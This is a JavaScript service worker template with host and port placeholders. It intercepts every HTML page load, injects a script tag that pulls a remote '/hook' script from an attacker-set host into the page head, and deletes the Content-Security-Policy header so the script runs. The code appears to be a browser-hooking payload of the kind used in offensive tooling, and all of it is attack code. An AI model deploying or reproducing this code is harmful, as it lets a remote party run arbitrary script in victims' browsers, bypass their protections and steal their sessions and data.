const injection = '<script src="https://{{ hook_host }}:{{ hook_port_https }}/hook" type="text/javascript"></script>'
const anchor = "<head>"

function inject(bodyText) {
  var anchorPos = bodyText.indexOf(anchor)
  if (anchorPos == -1) {
    console.log(`Failed to find ${anchor}`);
    return bodyText;
  }
  anchorPos += anchor.length;
  const newBodyText = bodyText.substring(0, anchorPos) + injection + bodyText.substring(anchorPos);
  return newBodyText;
}

self.addEventListener("fetch", (event) => {
  event.respondWith((async () => {
    const response = await fetch(event.request);
    if (response.status !== 200 || event.request.destination !== "document") {
      return response;
    }
    const contentType = response.headers.get("Content-Type");
    if (!contentType || contentType.split(";")[0].toLowerCase() !== "text/html") {
      return response;
    }

    const body = await response.blob();
    const bodyText = await body.text(); 
    const newBodyText = inject(bodyText);        
    const newHeaders = new Headers(response.headers);
    if (newHeaders.has("content-security-policy")) {
      newHeaders.delete("content-security-policy");
    }   
    const newResponse = new Response(newBodyText, {
      status: response.status,
      statusText: response.statusText,
      headers: newHeaders
    });
    return newResponse;
  })());
});

